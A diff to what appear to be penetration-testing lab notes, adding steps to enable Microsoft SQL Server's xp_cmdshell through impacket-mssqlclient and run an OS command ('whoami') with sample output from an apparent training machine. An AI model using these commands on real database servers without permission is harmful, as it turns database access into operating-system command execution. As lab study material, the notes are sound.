@@ -232,6 +232,16 @@ xp_cmdshell                                     0             1              0  
 
 **Reconfiguration steps**
 
+#### One line command
+
+The simple one liner in impacket-mssqlclient can do the honours for us.... :)
+
+```bash
+enable_xp_cmdshell
+```
+
+#### Alternative
+
 1. If sp\_configure command is set to show advanced options we can just directly set the xp\_cmdshell option (aka directly skip to step 5). The best way to know this is to run the command in step 5.
 2. If we get the error shown below:
 
@@ -264,6 +274,26 @@ EXEC sp_configure 'xp_cmdshell', 1;
 ```
 
 * Run reconfigure again to allow the xp\_cmdshell method. Test if its working or not using the above diagnosis command.
+
+We can use xp\_cmdshell after enabling it like follows:
+
+```sql
+SQL> xp_cmdshell "whoami"
+```
+
+A sample output is as follows:
+
+```
+output                                                                             
+
+--------------------------------------------------------------------------------   
+
+archetype\sql_svc                                                                  
+
+NULL  
+```
+
+
 
 
 
